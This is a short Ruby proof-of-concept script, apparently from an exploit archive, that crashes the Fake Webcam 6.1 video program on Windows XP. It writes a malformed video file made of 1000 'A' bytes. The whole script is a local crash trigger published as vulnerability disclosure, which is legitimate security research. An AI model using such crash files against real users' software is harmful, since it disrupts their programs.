#!/usr/bin/ruby
#############################################################################
# Title:		Fake Webcam v.6.1 Local Crash PoC
# Impact: 		Crashes the process
# Tested on: 	Windows XP SP1/SP2 EN
# Target:  		Fake Webcam v.6.1
# Download Link:	http://www.fakewebcam.com/Download/setup.exe
# Author:		Anastasios Monachos (secuid0) - anastasiosm[at]gmail[dot]com
# Greetz: 		offsec team, inj3ct0r team
#############################################################################
path = "c:\\a.wmv" #wmv/avi/flv/mpeg/mp4
f = open(path, "wb")
f.write("\x41" * 1000)
f.close()
